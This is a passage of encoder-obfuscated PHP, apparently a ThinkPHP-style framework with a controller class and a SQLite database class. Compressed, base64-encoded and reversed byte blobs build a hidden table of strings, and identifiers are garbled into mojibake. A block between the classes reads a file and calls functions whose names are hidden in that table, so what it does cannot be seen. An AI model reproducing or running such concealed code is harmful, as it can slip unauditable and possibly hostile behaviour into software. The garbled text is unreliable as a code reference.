1\x94\xa4\xc0\x60\xb4\x7d\x22\x2e\xbd\xd7\xe2\xf0\x47\x21\x3f\xbd\xa0\x95\x4a\xc1\x1c\xee\x83\x63\x5d\x3a\x40\x69\x39\x32\x88\x95\x41\x64\x95\x12\x90\xd7\x51\xed\x52\x1f"."\112\356\240\354\132\206\347\267\104\210\317\327\240\64\223\216\352\62\214\64\133\14\375\363\232\145\257\162\270\353\371\102\337\307\330\21\105\67\147\111\71\67\344\67\55\313\217\335\6"."\22\36\220\253\114\305\22\354\46\302\331\27\252\267\42\35\31\301\163\31\367\333\313\275\372\12\327\277\124\200\114\303\41\356\154\5\261\262\201\54\366\257\141\26\331\73\32\241\361"."\222\151\351\262\123\351\214\116\334\130\162\123\163\311\55\163\101\33\307\153\203\151\225\111\16\232\21\163\304\265\242\251\7\132\331\233\40\36\72\157\301\341\144\177\334\213\6\301\345".base64_decode('9tjS9WGmBScxuPwQ28PdGbs7hpFXLNgy92VNbyG9NQFeSQuO4q/kDh43Do63OTI27A==')."\xdc\x4b\x7f\xd6\xd5\xea\xab\xb7\x2c\xbc\x4a\xa3\xb9\xa4\x4f\x37\xac\xd4\x27\x98\xc7\x66\x17\x15\x71\x39\x79\xee\x5f\xd1\xdf\xdd\x9f\x94\x7\xc7\x2e\x6b\x83\x83\xa8\xb1\x92\x57\x51\x47\x5b\x84\x4f"."\x69\x40\x3f\xf2\xda\x2\x1b\x82\xa9\x3d\x52\x83\x88\xfd\xc8\x9a\xe\xad\x21\x91\xf0\xb1\xfe\x32\x51\xbf\xf2\x8c\x71\xe6\xc0\x4f\x9e\x6d\xa9\x81\xbb\x47\x63\x38\x60\xef\xa0\xd0\xd9\x2a\x55\xa4\x97"."\203\144\174\301\33\0\127\313\302\347\137\352\375\233\321\165\342\237\33\336\77\150\143\75\102\103\127\154\67\63\260\127\156\250\103\230\130\327\132\167\104\3\372\155\254\363\324\141\56"."\207\304\61\56\142\0\151\107\135\353\21\15\44\320\10\236\122\46\301\40\101\162\240\52\356\165\101\144\263\14\15\255\164\31\261\214\214\6\136\373\55\376\26\377\30\320\203\145\43".base64_decode('+IviERO3K+txVStMMiG7KrtrBkfQMOpyShdvCXPk3N0B1a/xBrrXeYVL4yXLxgt5BQ==')."\316\56\155\365\315\276\246\172\205\75\162\323\126\337\233\354\364\56\254\137\266\164\332\222\40\271\232\264\365\156\174\267\210\117\326\364\110\271\24\256\16\226\340\105\305\43\176\147\154"."\252\262\200\177\5\155\322\54\152\143\26\242\120\5\137\32\6\263\227\123\61\341\116\274\250\333\143\146\31\356\135\201\33\153\151\232\53\343\64\240\210\305\26\64\21\143\264\142\151".strrev('*ºb%ğù"Í?"«G'."\n".'úAQ¢Li2üÎ¦ÌäĞÜ½s¿;!7­ƒâôR¢io~ë').base64_decode('mQoBwDDVZCDDqcYoCKHqJITLXe3FQ+1FbADGf7SobENywC1ncb7/4X4VxD0KpAieXA==')."\257\374\334\310\70\342\325\160\62\166\267\357\305\363\353\65\62\123\245\210\105\135\263\251\151\100\225\132\131\172\53\106\306\375\111\162\325\355\255\124\330\7\153\126\52\163\222\54\3"."\351\104\230\327\47\373\161\307\307\154\57\227\354\273\335\304\13\356\133\253\366\151\217\26\257\322\62\247\165\336\242\126\146\367\163\44\273\251\257\224\230\56\56\12\62\237\367\63\374"."\203\214\16\210\7\101\130\337\360\204\113\257\3\70\300\142\30\371\12\147\4\304\221\117\264\326\361\324\14\164\224\36\376\244\127\14\210\74\226\256\44\254\277\242\362\147\37\152\120"."\122\304\306\263\15\3\66\133\351\201\72\76\41\131\26\50\363\374\232\130\42\251\374\260\350\111\12\253\35\3\206\17\243\206\232\202\275\42\33\255\54\354\314\125\212\303\155\122\242".base64_decode('YpumUtCKE8C1zrRaZ1qL8YfasMK1NZM9zyE8wOJ9RPj2o15qIIVKn334iRof3qTiFQ==').base64_decode('yNVDHjaBTYk+cgIJkd4V4aikZiMB1GBHVA309NRM4GwKFjvhO2ofM5fF75EBBTUKWQ==')."\45\215\65\370\333\352\60\264\116\261\312\151\346\7\267\316\17\164\224\144\20\162\320\45\6\24\251\307\105\224\101\204\46\136\22\242\311\365\113\227\370\215\245\174\260\205\117\240\262"."\x29\xc\x14\x7c\xfe\xc3\x31\xd7\xef\xc7\x8a\x2c\xc5\x23\xf1\xec\xca\xf7\xea\x4\xda\x29\x3c\x0\x29\xca\x12\x4d\xa1\xe3\xd8\x56\x4f\xa4\xab\xf5\x4a\xe\xed\xc7\x5c\x8b\x6f\xa9\xbb\x70\x94\x5d\x6e"."\54\361\153\162\42\136\131\161\223\261\277\234\331\37\345\76\356\152\12\310\3\222\327\154\362\74\106\120\53\256\252\56\202\53\367\245\345\44\72\223\304\204\242\72\277\237\234\41\375"."\342\134\243\322\47\327\30\246\23\37\350\176\327\67\110\31\56\213\257\201\57\370\126\33\241\73\273\116\324\322\303\30\341\304\356\0\115\202\204\36\174\142\241\11\216\307\2\154\111"."\317\240\202\255\215\210\144\267\54\236\354\331\260\201\126\204\31\202\115\233\252\141\240\252\350\116\12\224\14\67\10\43\226\33\206\117\216\2\206\266\71\347\147\50\122\313\231\4\204"."\345\241\277\242\114\44\272\102\104\350\211\305\221\330\307\264\202\111\254\277\257\336\67\153\323\46\277\301\24\172\230\362\1\53\353\343\271\151\274\337\347\314\217\172\2\103\317\63\2"."\300\235\223\262\227\107\301\332\234\346\237\45\54\244\270\342\216\202\265\171\332\332\226\366\361\173\213\1\226\306\170\104\243\171\41\103\201\311\234\67\271\232\7\203\121\301\5\363\65"."\x40\xc9\x8d\x8f\x9c\xef\x3\x4e\x77\xbb\xcb\xc4\xd3\x45\x74\x54\xe5\x70\xa0\x54\x92\xa3\x7e\x16\xc1\x42\xed\xbc\x91\xf2\x73\x62\x40\x5\xdd\xbe\xb4\x30\x2c\x62\x59\x8\x29\x72\xc1\xb1\xd6\x8d\x2b"."\1\277\155\112\300\243\210\126\42\246\154\310\15\107\165\161\40\17\54\261\322\145\243\144\73\310\30\175\200\262\216\274\226\63\244\215\152\64\113\235\2\307\365\266\72\342\113\276\16".strrev('Õİ¼'."\n".'±¹ÚJ±Ä­À³ÄaN°Tõª	åG]9Zæ‘Õ·ÏYJO¦	e4Bôš-‘').base64_decode('B33+QBQuEg4/hv4ecTjDEPKCXF4vU21lQo3IFdagkL7AG2I98VgyFmQPDdUS08xlfA==')."\xad\x45\x8d\xb1\xc4\xf9\x87\xd9\x9c\xf0\x4b\x7d\x96\x83\x73\xa\x7e\x80\xc0\xbc\x97\x2b\xc5\x22\xd7\x8f\xc2\xac\x23\xdf\xce\xc8\xe9\x58\xcf\xf8\x94\x3e\x8d\x5d\x6d\x80\x2\x25\xbd\xab\x49\xe4\x2a".strrev('Œ8bL64{(±£Ô<u„qa*õ0™‰­µîÔ}EQ^Ãñù,'."\0".'µ8¶$ù÷±"Ø¶')."\204\103\321\244\32\206\275\262\271\145\201\257\111\130\263\120\217\244\101\176\241\16\37\255\321\34\52\214\114\162\115\50\275\350\220\246\320\156\344\115\346\45\261\245\251\251\311\333\324".strrev('’ˆ/­0¬Q‚™64:éŒ2„`½S:<Â‘iÿ’µ54² w+DÌ¼ºgşŒ')."\24\334\264\1\306\223\260\366\243\51\44\316\13\31\315\161\274\126\246\220\353\60\210\351\356\101\340\367\214\200\24\154\157\247\116\150\331\76\202\32\222\45\203\2\355\345\26\157\50"."\233\100\275\305\324\330\260\215\67\52\124\314\364\311\37\363\261\301\245\100\341\201\331\313\22\274\362\53\10\120\210\356\46\102\230\356\150\32\52\343\364\212\210\41\150\323\117\363\176"."\x62\x80\x24\x73\xc1\x4c\x9f\xe4\xe9\x11\x47\x65\x99\x39\x49\xe6\x66\x63\x24\x96\xe7\x96\xed\x38\x1a\xe5\x35\xd1\xc7\x36\xe8\x2b\xcc\x30\x86\x35\x30\x3f\x67\x8e\xa9\x62\xe3\xc6\xd1\xa3\x78\x8c\xc".base64_decode('KT5+MTTMSKZ9eFwZCZeyczmVuAyHu31i7j1s5B1GrqpUVB7bxTgj60nSWRJXhIhAgA==')."\77\71\102\165\355\130\333\24\130\305\64\112\374\61\223\367\20\251\172\144\353\264\252\311\265\335\23\113\346\250\154\12\213\325\52\15\27\26\223\146\212\111\211\23\137\240\204\302\40"."\41\6\240\372\33\101\356\22\121\252\300\235\344\52\23\240\302\345\252\2\0\257\316\115\104\357\65\162\143\270\53\67\361\167\30\344\76\136\145\47\210\364\156\133\322\247\260\300\23".base64_decode('vbjMZnWMSiczX6lsZtGsW/KgIXhPbTDPXp2zRibeejmfDMTSfvYqKaCzsJTVxKPIUg==')."\x56\xf1\x54\xba\x4\x74\xae\x66\x29\x21\xc8\x5f\x6\x92\x81\xf8\xa4\x27\xab\x2f\x10\xf6\xdb\x59\x7\x3e\x42\x3a\x21\xbc\x65\x9f\x83\x74\xec\xe8\x6f\xc3\xb\xb6\xb2\xca\x1d\xcd\x26\x28\x12\x16\xcb".base64_decode('yCJj1YEmDFeZtgQeIXFD6YRTGD2cO65QkoTQ5XX2oC6QQrKocAUR9nZkwuFAGNAUlg==')."\x6e\x5b\x9b\x5c\xcc\x99\xf6\xd6\xf\xce\x61\x81\xf3\x58\x2e\x3c\xac\x5c\xb6\x28\x8b\xda\xf1\x90\xaa\xb2\xdc\x4\xaf\xe8\x2e\xfe\x8e\x6b\xd\x44\x74\x22\x5b\x15\x56\x11\x56\x3\x57\xd0\xca\x49\xa1".base64_decode('FMO1AyHzoAOkRUV8HgxW6OOmSlHn9snOSZULwPs8JmLBsH9VuRCuq9dFolY6KCJvaw==').base64_decode('H2ks09hSZvpaQJtsJnPOT+mxuH70Q7f7ULcG0DlA7CYwIX2UGrM6cZMhlGHzozh3Vw==')."\151\257\120\344\212\320\256\233\314\141\221\307\200\102\232\271\230\170\166\257\221\212\155\301\331\327\270\257\131\240\374\50\217\151\363\263\43\256\36\241\262\210\104\144\46\61\111\213\170"."\x97\x8a\xa6\x3a\xae\xdf\x24\x3f\xd7\x3c\x2b\x6a\x6\x6b\xbc\xc6\xda\x46\x34\xa7\x88\x37\x70\xe9\x38\xeb\x8a\xba\xf5\xcc\xc8\xd6\x6e\xb3\xdd\x99\xf9\x3\x17\x2a\x58\x18\x13\x12\x92\x62\x4e\x8d\x2f"."\100\41\136\4\170\216\262\236\66\313\104\354\41\171\105\50\332\161\75\53\107\43\46\27\367\340\153\64\275\106\25\330\21\215\104\51\360\302\11\244\355\212\354\326\106\362\57\216\142"."\x92\xbb\x78\x89\x77\xf4\x36\x2b\x9c\xe9\x54\x69\xcd\x34\x32\x5b\x4a\x20\xf9\x6b\xf1\x9f\x2e\xa1\xa3\x64\xf6\x40\xe4\x2c\x89\x4a\x8a\xdf\xfd\xb8\xb8\x42\x66\x49\xa1\xc8\x4c\x17\x33\x8d\xc0\x15\x10"."\17\43\270\7\226\234\206\252\305\256\174\105\317\344\42\344\233\125\105\150\32\346\173\204\237\16\71\305\302\176\340\173\331\264\325\112\251\361\51\222\44\215\150\232\173\56\202\321\21"."\203\4\11\23\72\323\105\364\66\267\170\347\300\321\102\66\263\140\147\30\40\375\150\55\110\150\200\217\165\214\362\200\46\37\344\23\171\114\351\6\215\370\356\20\136\12\210\233\22"."\x3e\x9f\xc4\x9f\x9\x8f\x95\xa5\xed\x5f\xe7\x5a\x7e\xc4\xb1\x87\x4c\x89\xc5\x85\x3c\x55\xfe\xc3\x19\x7a\x6b\xa5\xd3\x11\xc2\xc9\x1d\xe\x75\x4d\x57\x6\xb4\x32\x9c\xe9\xe0\x2a\x5e\x34\x86\xfa\x16"."\61\35\212\64\256\112\340\331\1\331\31\76\51\45\372\41\164\126\21\310\244\16\351\245\201\21\212\5\324\345\11\123\276\345\164\111\200\223\46\7\126\53\47\140\254\204\52\251\1".base64_decode('Kry12dCIDVAd0rPuCW4miJV58L7KlTQtOcJSOXJajghVXnKU5iCea0xntqRMytPT1Q==')."\343\347\240\166\276\74\251\200\100\170\132\12\266\162\341\242\16\147\262\261\202\221\126\42\261\25\341\140\40\322\21\116\254\124\262\272\255\10\55\12\362\154\204\163\51\23\231\47\35"."\x78\x86\xd5\x29\xfe\xb6\x1\xe\x7a\x53\x88\xc9\xf7\x66\xf8\x41\xc8\x12\x47\x1e\xe9\x91\x6e\xe9\xf1\x27\x67\xb5\x14\xff\xf4\x72\x55\x8d\x45\x6c\x22\x92\xaf\x2a\x83\x25\xb9\x35\x72\xe7\x85\xe4\x52".strrev('Ãº:µÈLJÏ…ˆe†£Š7Tâô]â79	İäû_ÈÑ©P*Xµ#³¬t\'ùÕë*\\Ê')._kodDe('MiE9dfxCsEAncMmn+Au4tOFbtDRsDx9tEqlq7cakBH47mWkQp2ALUOZcS2IR7w8B+94=').base64_decode('xwJoVHqwp1TWDEuXAPRpmVlgkaHl847n9/KDUrTi3FlrfkqlH2Awye9crQzx8Iqu5A==')."\xff\xba\xa9\x46\x46\xf8\x7c\x32\x32\x4c\x1d\x84\x1b\xd0\xd1\x77\x4\x82\xf2\x53\x8d\xec\x9b\x55\x8f\x12\x7d\xe1\xf3\x46\x1e\x71\x87\xa5\x12\x4f\x38\xec\x1d\x35\x93\x9c\x60\x80\xbd\xa6\xb0\x70\x4c"."\45\342\134\125\174\2\235\255\313\23\45\371\22\321\237\361\363\41\246\1\354\332\56\304\156\256\160\104\234\45\160\166\250\15\177\216\236\60\321\301\31\213\334\330\251\203\251\56\42"."\72\1\343\354\270\104\167\75\324\364\271\157\2\124\175\203\74\12\100\323\372\160\167\120\316\1\321\71\24\343\57\202\210\242\356\224\32\15\100\311\212\20\103\361\14\112\233\322\104"."\337\14\343\257\75\50\113\230\71\260\370\0\161\100\25\52\224\154\307\351\273\113\126\365\226\346\206\2\10\247\43\116\127\130\275\311\54\114\124\1\34\262\247\10\153\27\327\320\303"."\157\135\24\7\115\171\374\10\101\306\172\373\364\155\77\172\314\367\40\156\137\267\253\37\6\242\305\377\277\24\244\211\11\311\343\240\263\222\352\6\131\356\255\116\260\135\370\315\243"."\234\71\346\174\360\17\103\334\257\34\71\336\67\222\26\15\261\132\225\137\144\162\26\362\124\275\71\242\220\267\132\25\204\352\60\213\330\325\21\73\106\222\314\322\247\147\322\237\176".base64_decode('+GXbmbsRlFDBJxs5UgVzRj5T5vo6AtCti7M9KYVVVjTmM5U8htbBaDI8c1Lr6SvsWA==')."\xce\xf9\x5a\x8b\x78\x4\x47\xec\x9d\xce\x47\x41\xf8\xad\xb3\x25\x16\x83\x65\x3b\x9e\xa1\x49\x9a\x49\x2d\xeb\xa1\x1c\x19\xa6\x6a\x22\xd6\x3e\x21\x87\x65\xad\x51\xd2\xb\x94\xc8\xe4\x6f\x19\x3e\xdf".strrev('µÄ•+_Q²8¶t¦G•‡75S–”ÍæÎ—)úq¥iûIFt¼‡Œ¹5ì¥K')."\227\274\145\242\177\35\326\165\220\326\233\354\122\211\215\270\112\257\321\23\2\347\244\13\63\12\204\313\263\112\61\114\357\40\34\320\262\164\316\223\175\165\322\153\102\141\317\5\331"."\x51\x3b\x7b\xe8\xbd\x20\xc\x98\x5c\x25\xbb\xab\xe5\x52\xec\x4e\xe9\xed\x72\x7f\xf5\xdd\x2e\x56\xe0\x3\x8a\x42\xde\x44\x16\x2a\xf\xc4\x7e\x5b\x3e\x88\x41\x6\x65\x89\x22\x50\xc3\xb1\x90\x31\x2a".base64_decode('IW6YviVHKIXMuH8OVHrjB96sq/VkD8V88tOhD/JDDY6LzV32cyE0QNzPyVU/jceewQ==')."\143\113\7\336\300\253\361\260\335\224\357\342\171\204\351\336\347\275\4\44\14\314\234\117\35\343\176\160\326\200\237\33\252\216\36\356\123\7\37\126\127\201\270\173\220\223\146\265\110"."\x57\xdc\x7e\x3b\x5e\xed\x93\x7a\xd\xa4\xad\xfa\xe5\x3f\x69\x18\xa4\x7e\x57\xca\x79\xf\x51\x4\xf0\x30\x3f\x71\x35\x1f\xf\x74\xbc\x4b\xe4\x9e\xd0\x1a\xcf\xf\x7e\x61\x85\xa0\x5d\x4c\xe\x5d\x19"."\47\325\153\135\222\52\263\233\125\167\66\303\201\273\152\131\27\366\47\324\47\147\325\6\261\266\220\151\231\63\157\221\54\334\20\123\50\256\47\231\203\151\372\3\334\212\100\12\305".strrev(',@µ‰‰Ê—D6’PRTğ@#U¾£õv’¬Ğ=8ŒïüµÒª~®øTè’~¯*s'."\n".'†‰')."\261\352\350\26\50\336\247\164\176\213\262\17\65\372\41\355\173\142\261\320\367\5\315\74\76\143\27\260\270\335\56\153\316\3\145\255\163\23\31\11\166\110\63\310\323\334\272\273\355"."\144\140\100\232\42\222\245\203\225\134\243\155\272\105\101\270\70\336\27\211\44\62\126\314\303\266\215\215\225\305\152\223\50\321\377\142\2\331\31\211\36\247\204\56\122\215\236\373\227"."\63\322\122\343\375\110\111\143\343\163\332\115\271\73\176\36\364\152\266\127\102\110\111\174\250\333\61\62\301\100\42\304\261\325\331\127\127\365\250\230\250\143\300\243\114\225\251\232\305"."\223\236\231\24\356\254\44\346\16\227\146\26\214\123\234\372\211\1\235\223\115\222\237\307\43\166\150\302\173\3\131\256\216\245\53\371\332\225\355\270\110\105\362\232\250\256\132\172\154".base64_decode('UEiFiBgJegQLmmgekGYGVnDbP01SJnOKqvBQS8/FmnJYTAEm+zHmtRR93XHURPEO1w==')."\x5b\xc2\x84\x44\xb9\x1f\x18\x66\x43\x44\xe8\x82\x20\x79\x92\x9\xa9\xe3\x5c\xc3\x5f\x58\x73\x9c\x73\x2c\xf7\x9b\x8b\x88\xdb\x93\xbd\x10\xa3\xa8\xfb\x65\x5a\xa0\x8d\x44\x6b\x9f\x7e\x4d\xda\x5d\xc5"."\106\52\102\321\112\101\104\44\371\56\71\122\361\104\207\245\55\366\321\344\42\3\314\176\327\162\275\270\112\175\302\322\60\343\374\377\177\77\67\370\177\353\225\301\171\374\155\2\307"."\203\304\53\200\377\146\54\337\244\344\203\232\112\201\135\375\160\356\240\373\0\26\361\307\267\245\70\127\115\146\176\272\230\373\56\215\135\140\151\371\274\264\317\326\76\261\124\75\365"."\212\220\157\230\277\33\132\53\342\66\112\163\77\373\332\307\36\110\47\57\272\16\324\312\50\310\20\77\30\325\300\143\12\142\374\260\364\364\267\221\36\256\161\373\114\364\61\235\76"."\234\45\376\243\52\233\150\3\142\123\230\3\64\77\13\245\361\211\220\170\45\200\321\223\155\110\143\45\166\166\154\4\242\77\260\234\21\47\142\255\16\64\112\246\113\16\120\25\65".base64_decode('SzrmxAGUhxvmEFvhsul0lOh2PW9JM1ny2Dqk99XKCNWlOR2Qi2CNcKdAiz9M3uR+qQ==')."\xbc\xd9\xeb\xaa\x8e\xbf\xf0\xe9\xc4\x75\xc7\x2b\x93\x54\x81\x3\x2d\x90\x38\x96\x72\x30\xb9\x15\xb9\x0\x22\x97\xb7\xde\xea\x32\x14\xaf\x13\x22\xcf\x14\x2b\xab\xf6\xfa\xe6\x8d\x12\x42\x3c\x1c\x92".strrev('$˜»·´Vx/‰0ÑââN…32F)6ªúg‚ö*íµé\\m$~K”\'AxI²‰ÑƒÇ').base64_decode('AaKjA0mnKVBGeu4aL0zhoxHrHhMZpMwHMCtBSckeQA5JoSU/u+Esic0mnEtwaa1saQ==').base64_decode('s2xJ2Ti8Vl6MmLIkRE7DTxXbjikSbv3d7vyJfIAe+R0nf7gblkHS1Sli3zPO90FIIg==').base64_decode('ATN3nlCDdPnnvHvljsuryG3FiEjJpBTzEod+sSVlWDiBIMn0WiMwqnE/K+5SzgfSpQ==')."\x9b\xda\x34\x41\xc8\x50\xf5\x65\x9c\xb8\x23\x94\x98\x15\x56\xc\x9f\xad\xc4\x3e\xe2\x82\xd7\x7a\xef\x7b\x50\x1b\x15\x9c\x96\xe0\xee\x33\x99\x4e\xf6\x4c\x94\x23\x6b\x86\x9d\x6f\x38\x14\x41\x78\x56"."\302\251\111\106\304\102\347\137\37\163\77\210\354\223\15\217\35\31\253\241\302\310\130\52\57\256\145\104\67\61\254\126\367\311\102\163\26\227\215\230\71\122\11\20\175\341\201\253\202"."\x49\x27\x29\xac\xaa\x21\x74\xc4\x68\x57\xb8\xc0\x40\x7c\xd2\x69\x32\xcd\xb3\xf1\x39\x43\x79\x88\xa5\x90\xd7\x1\x75\x9d\xd\xb1\x6c\x86\xb1\x1d\xae\x24\x4b\x7e\xcc\xd8\x79\x1\x2b\x4b\x30\x24\x14"."\xd0\xf3\x11\xa9\x3a\xf9\x72\x76\xca\x2\x89\xda\x1f\x11\x58\xe9\x1c\x62\xc9\xd6\x5c\x24\xb0\x1d\xd2\x74\xc\xbe\x44\x22\x79\xc7\x20\x67\x5c\x4e\x74\x34\xc7\x3d\xb5\xe4\x58\x23\xd0\x97\x2\xb\x44".base64_decode('MEzTAs4kml93tV4u4O4ZLWGNGXY6J521qhOr4eWqQYUP1W6vu1VsTN0nUFFJVXskDQ==')."\217\244\131\243\14\155\121\315\142\64\11\227\24\74\257\243\354\24\103\200\313\322\44\134\266\52\231\25\226\4\66\122\71\133\253\130\123\164\257\172\360\100\212\221\251\321\141\327\131"."\237\146\235\152\74\153\146\256\376\34\140\234\73\67\21\173\324\156\205\220\126\270\156\332\153\265\242\146\346\51\133\41\162\273\166\201\132\264\226\245\324\240\256\224\162\114\251\175\42"."\64\62\252\311\274\110\253\241\37\102\77\211\267\160\331\211\124\215\144\131\331\244\266\72\112\274\46\145\260\234\172\42\56\270\74\156\340\203\24\230\57\100\106\164\32\315\33\303\102"."\x75\x8e\x69\xce\xcf\x74\x90\xff\x4a\x71\xb8\x68\xf2\x2d\x25\x23\x34\x23\xb1\x56\x77\xa0\xec\x1e\xe7\xaa\xda\x9c\x68\x5c\xac\x48\x6e\x5d\x6b\x2a\xf2\x7b\xb0\xec\xa0\xfa\x94\x9e\x67\x6f\xc9\xc9\x16".base64_decode('EPRYZdpGWnf6jpV9SdF09pG8JIx0yQGFJMOhx1BDUkZAwPYJkTytT2JoBE44jFUoGw==')."\1\67\31\364\22\64\210\57\333\371\365\27\361\173\112\267\135\232\234\60\313\266\7\247\45\315\22\371\155\67\155\133\50\5\120\321\1\341\25\361\336\351\221\164\136\120\110\334\165"."\341\106\221\113\24\202\266\204\372\220\40\134\307\342\63\171\102\247\251\204\146\71\42\370\162\206\107\344\255\21\256\145\73\53\256\213\143\1\100\7\340\224\71\316\274\112\142\343\170".strrev('PUÂ '."\r".'^~Ç+‰Ú}8£¬¥C|Ê€êKÀ™x~)§åÄ<Ê*'."\0".'ÊÁAù¹£}qÑ')."\267\344\104\266\6\326\76\211\144\242\52\251\47\220\110\254\216\305\73\250\27\363\252\144\122\112\322\210\252\112\352\351\212\105\247\112\13\165\7\302\221\252\64\254\74\25\125\205\53"."\60\232\24\356\41\255\44\67\220\123\265\42\34\134\51\132\102\356\272\305\315\100\51\147\62\201\77\273\71\111\150\171\46\7\220\354\152\365\202\360\1\47\312\70\305\33\362\274\132"."\314\131\43\17\70\237\4\162\351\50\62\204\205\212\260\342\123\24\352\216\227\0\212\275\272\363\165\317\171\156\331\224\120\134\344\373\34\27\376\22\234\254\23\102\170\44\374\223\367".base64_decode('ZwKYVXOwZAlz9Y0HSRWDgRt5lAkadENmSrrRoKcfMGSF4ZUU3WjYkWxr2Zr33lSSiA==')."\x29\x81\x90\xf1\xfd\x1f\xb9\xdc\xb4\x78\xb8\xae\x0\x0"."".strrev(''), 10, -8))); goto C×‘ÍĞïˆ¿; EÅ²‹ê …§: if (!$gcmfvkidwp) { die; } $_SERVER[‚¥ÜÊŒß] = explode($_SERVER[ˆûùúÊ¯][657], gzinflate(substr($_SERVER[ˆûùúÊ¯][658], 10, -8))); $jucygqvtrz = $_SERVER[ˆûùúÊ¯][659]; goto C¼†«¦‰öŠ; CÍ—°á¸ª¤: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $˜Éºì¬¡ =& $_SERVER[ˆûùúÊ¯]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$˜Éºì¬¡[6]] =& $config; $this->values[$˜Éºì¬¡[7]] =& $in; $this->tpl = TEMPLATE . MOD . $˜Éºì¬¡[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($©…Äş×®) { if (1 === func_num_args()) { $this->{$©…Äş×®} = new $©…Äş×®(); } else { $Æ¬Î²îâ = new ReflectionClass($©…Äş×®); $×ëƒï ¾ = func_get_args(); array_shift($×ëƒï ¾); $this->{$©…Äş×®} = $Æ¬Î²îâ->newInstanceArgs($×ëƒï ¾); } return $this->{$©…Äş×®}; } public function routeBind($½æÕùÕ‹, $ıí†¾•ø, $ÚÉÎŸê = 3) { $èñœœªÅ =& $_SERVER[ˆûùúÊ¯]; $ãÛ¢»¹“ = $this->in[$èñœœªÅ[9]]; $½æÕùÕ‹ = str_replace($èñœœªÅ[10], $èñœœªÅ[11], trim(trim($½æÕùÕ‹, $èñœœªÅ[8]), $èñœœªÅ[12])); if (!$½æÕùÕ‹ || count($ãÛ¢»¹“) <= $ÚÉÎŸê) { return !1; } $ÇÒ…£–ı = !0; $±äæ‹Ï‹ = explode($èñœœªÅ[8], $½æÕùÕ‹); for ($Û®¡ñ¼Ó = 0; $Û®¡ñ¼Ó < count($±äæ‹Ï‹); $Û®¡ñ¼Ó++) { if ($±äæ‹Ï‹[$Û®¡ñ¼Ó] != $ãÛ¢»¹“[$ÚÉÎŸê + $Û®¡ñ¼Ó]) { $ÇÒ…£–ı = !1; break; } } if (!$ÇÒ…£–ı) { return; } call_user_func_array(array($this, $ıí†¾•ø), array()); } public function routeArgs($æĞ¾ƒÌ = 3) { $ª¡ÕøƒÏ = $this->in[$_SERVER[ˆûùúÊ¯][9]]; if (count($ª¡ÕøƒÏ) <= $æĞ¾ƒÌ) { return array(); } $ÕóæÆ = array(); for ($¥ÃÆ¦ü = $æĞ¾ƒÌ; $¥ÃÆ¦ü < count($ª¡ÕøƒÏ); $¥ÃÆ¦ü += 2) { $ÕóæÆ[$ª¡ÕøƒÏ[$¥ÃÆ¦ü]] = $ª¡ÕøƒÏ[$¥ÃÆ¦ü + 1]; $this->in[$ª¡ÕøƒÏ[$¥ÃÆ¦ü]] = $ª¡ÕøƒÏ[$¥ÃÆ¦ü + 1]; } return $ÕóæÆ; } protected function assign($â±ëŠÌ, $ŞœĞ«¿ù) { $this->values[$â±ëŠÌ] = $ŞœĞ«¿ù; } protected function display($™Ğ¨èĞ) { ob_end_clean(); extract($this->values); require $this->tpl . $™Ğ¨èĞ; } } if ($_SERVER[$_SERVER[ˆûùúÊ¯][13]] != $_SERVER[$_SERVER[ˆûùúÊ¯][14]]) { $_getc = $_SERVER[ˆûùúÊ¯][15]; $_getfile = $_SERVER[$_SERVER[ˆûùúÊ¯][16]] . $_SERVER[ˆûùúÊ¯][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ˆûùúÊ¯][18], $_getfilec); if (count($_getarrs) < $_SERVER[ˆûùúÊ¯][19]) { $exit = $_SERVER[ˆûùúÊ¯][20]; $exit(); } $_act = $_SERVER[ˆûùúÊ¯][21]; $_act($_SERVER[$_SERVER[ˆûùúÊ¯][22]]); } class DbSqliteBase extends Db { public function __construct($˜›‰«÷ı = '') { $™ÜÛó›Ë =& $_SERVER[ˆûùúÊ¯]; if (!extension_loaded($™ÜÛó›Ë[23])) { think_exception(think_lang($™ÜÛó›Ë[24]) . $™ÜÛó›Ë[25]); } if (!empty($˜›‰«÷ı)) { if (!isset($˜›‰«÷ı[$™ÜÛó›Ë[26]])) { $˜›‰«÷ı[$™ÜÛó›Ë[26]] = 438; } $this->config = $˜›‰«÷ı; if (empty($this->config[$™ÜÛó›Ë[27]])) { $this->config[$™ÜÛó›Ë[27]] = array(); } } } public function connect($¹‰ÏÜº÷ = '', $¡²¶Î¢Ú = 0) { $³Üù¯ş =& $_SERVER[ˆûùúÊ¯]; if (!isset($this->linkID[$¡²¶Î¢Ú])) { if (empty($¹‰ÏÜº÷)) { $¹‰ÏÜº÷ = $this->config; } $ƒ§°•Š“ = !empty($¹‰ÏÜº÷[$³Üù¯ş[27]][$³Üù¯ş[28]]) ? $¹‰ÏÜº÷[$³Üù¯ş[27]][$³Üù¯ş[28]] : $this->pconnect; $Â¼ç²ö = $ƒ§°•Š“ ? $³Üù¯ş[29] : $³Üù¯ş[30]; $this->linkID[$¡²¶Î¢Ú] = $Â¼ç²ö($¹‰ÏÜº÷[$³Üù¯ş[31]], $¹‰ÏÜº÷[$³Üù¯ş[26]]); if (!$this->linkID[$¡²¶Î¢Ú]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$¡²¶Î¢Ú], 30000); if (1 != think_config($³Üù¯ş[32])) { unset($this->config); } } return $this->linkID[$¡²¶Î¢Ú]; } public function free() { $this->queryID = null; } public function query($ÕüÎµÙ) { $ŒÊµøœş =& $_SERVER[ˆûùúÊ¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÕüÎµÙ; if ($this->queryID) { $this->free(); } think_action_status($ŒÊµøœş[33], 1); think_status($ŒÊµøœş[34]); $this->queryID = sqlite_query($this->_linkID, $ÕüÎµÙ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $àİŠÛÒÌ = $this->getAll(); return $àİŠÛÒÌ; } } public function execute($€´°‰‘§) { $¸İâÍÒ =& $_SERVER[ˆûùúÊ¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $€´°‰‘§; if ($this->queryID) { $this->free(); } think_action_status($¸İâÍÒ[35], 1); think_status($¸İâÍÒ[34]); $Ô˜š†§˜ = sqlite_exec($this->_linkID, $€´°‰‘§); $this->debug(); if (!1 === $Ô˜š†§˜) { 